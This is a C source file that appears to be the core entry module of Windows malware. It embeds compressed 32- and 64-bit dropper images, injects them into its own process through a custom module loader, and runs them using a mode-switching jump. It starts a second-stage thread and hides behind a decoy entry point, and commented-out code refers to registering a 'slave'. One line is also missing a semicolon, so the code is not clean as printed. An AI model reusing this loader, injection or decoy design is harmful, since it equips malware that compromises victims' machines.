#include <config.h>
#include <ldr.h>
#include <ntapi.h>
#include <instance.h>
#include <register.h>
#include <module.h>
#include <crypto\crc32.h>
#include <crypto\aes.h>
#include <decoy\entry.h>

PRAGMA_WARNING_DISABLE(2415)
PRAGMA_WARNING_DISABLE(47)

/*
    compiler bugs: if "TestDropperContent" static its not parsed to the exit properly
*/

#define MODULE_EXPORT(NAME, RVA) RVA, 

static DWORD TestDropperFunctionsRva32[] = {
    #include "bin\dropper32.h"
};

enum {
    TEST_DROPPER32_COMPRESS_SIZE   = MODULE_IMAGE_COMPRESS_SIZE,
    TEST_DROPPER32_DECOMPRESS_SIZE = MODULE_IMAGE_DECOMPRESS_SIZE
};

BYTE TestDropperRelocContent32[] = { MODULE_BASERELOC };
BYTE TestDropperContent32[]      = { MODULE_IMAGE     };

#undef MODULE_BASERELOC
#undef MODULE_IMAGE
#undef MODULE_IMAGE_COMPRESS_SIZE
#undef MODULE_IMAGE_DECOMPRESS_SIZE

static DWORD TestDropperFunctionsRva64[] = {
    #include "bin\dropper64.h"
};

enum {
    TEST_DROPPER64_COMPRESS_SIZE   = MODULE_IMAGE_COMPRESS_SIZE,
    TEST_DROPPER64_DECOMPRESS_SIZE = MODULE_IMAGE_DECOMPRESS_SIZE
};

BYTE TestDropperRelocContent64[] = { MODULE_BASERELOC };
BYTE TestDropperContent64[]      = { MODULE_IMAGE     };

static PVOID TestDropper32;
static PVOID TestDropper64;

BOOL
TestDropperDesignLoad(VOID)
{
    MODULEDATA  Data32  = { TestDropperContent32, TEST_DROPPER32_COMPRESS_SIZE, TEST_DROPPER32_DECOMPRESS_SIZE };
    MODULERELOC Reloc32 = { TestDropperRelocContent32, sizeof(TestDropperRelocContent32) };
    MODULEDATA  Data64  = { TestDropperContent64, TEST_DROPPER64_COMPRESS_SIZE, TEST_DROPPER64_DECOMPRESS_SIZE };
    MODULERELOC Reloc64 = { TestDropperRelocContent64, sizeof(TestDropperRelocContent64) };

    if (IS_NULL(TestDropper32 = ModuleInject(NtCurrentProcess(), &Data32, &Reloc32, FALSE))) {
        return FALSE;
    }

    if (IS_NULL(TestDropper64 = ModuleInject(NtCurrentProcess(), &Data64, &Reloc64, TRUE))) {
        return FALSE;
    }

    return TRUE;
}

VOID
TestDropperStart(VOID)
{
    #include <fastcall.h>

    typedef ULONG64 (STDCALL * PROC64)(PVOID64 Paramater);
    typedef ULONG32 (STDCALL * PROC32)(PVOID32 Paramater);

    /* x32 test */
    {
        PROC32 Entry = (PVOID)((ULONG_PTR)TestDropper32 + TestDropperFunctionsRva32[0]);

        RtlpCopyMemoryInline((PVOID)((ULONG_PTR)TestDropper32 + TestDropperFunctionsRva32[1]), &Config, sizeof(Config));

        /* compiler generates jmp instruction */
        __asm {
            call dword ptr [Entry]
        };
    };

    /* x64 test */
    {
        PROC64 Entry = (PVOID64)(ULONG64_PTR)((ULONG_PTR)TestDropper64 + TestDropperFunctionsRva64[1]);

        RtlpCopyMemoryInline((PVOID)((ULONG_PTR)TestDropper64 + TestDropperFunctionsRva64[0]), &Config, sizeof(Config));
        KiJumpLongMode((PVOID64)Entry);
    };

    $DLOG1(DLG_FLT_SUCCESS, "Stack is OK!");
}

static
ULONG
WINAPI
InitialEntrySplitted(VOID)
{
    #ifdef DEBUG
        UNICODE_STRING DebugName = CONST_UNICODE_STRING(SCFG_DLOG_CORE_THREAD1);

        $DLogInitialize(&DebugName, TRUE);
    #endif

    InitAes();

    //ULONG_PTR dwTries = 0;
    //QWORD qwTimeout = -MS_TO_100NS(200);

    //for (dwTries = 0; dwTries != 5; dwTries++) {
    //    if (LdrLoadWsapi()) {
    //        break;
    //    }

    //    if (!NT_SUCCESS(NtDelayExecution(FALSE, (PVOID)&qwTimeout))) {
    //        $DLOG1(DLG_FLT_CRITICAL, "NtDelayExecution failed!");

    //        return 0;
    //    }
    //}

    //if (dwTries == 4) {
    //    $DLOG1(DLG_FLT_CRITICAL, "Failed to find ws2_32.dll");

    //    return 0;
    //}

    //if (!RegisterSlave()) {
    //    return 0;
    //}

    if (!TestDropperDesignLoad()) {
        return 0;
    }

    TestDropperStart();

    return 0;
}

ULONG
WINAPI
InitialEntry(VOID)
{
    #ifdef DEBUG
        UNICODE_STRING DebugName = CONST_UNICODE_STRING(SCFG_DLOG_CORE_THREAD0);

        $DLogInitialize(&DebugName, TRUE);
    #endif

    if (!InitConfig()) {
        return 0;
    }

    if(!LdrLoadNtapi()) {
        return 0;
    }

    InitCrc32();

#if SCFG_IGNORE_ISTANCE == ON
    CreateInstance()

    if (TRUE) {
#else
    if (CreateInstance()) {
#endif
        HANDLE hThread;

        if (!NT_ERROR(NtCreateThreadEx(
            &hThread,
            STANDARD_RIGHTS_ALL | SPECIFIC_RIGHTS_ALL,
            NULL,
            NtCurrentProcess(),
            InitialEntrySplitted,
            (PVOID)RTLP_LCG_NATIVE,
            0,
            0,
            PAGE_SIZE,
            PAGE_SIZE,
            NULL
        ))) {
            $DLOG1(DLG_FLT_DEFAULT, "Second stage of InitialEntrySplitted started!");
        } else {
            $DLOG1(DLG_FLT_ERROR, "Failed to continue entry on different thread");
        }
    }

    return DecoyEntry();
}
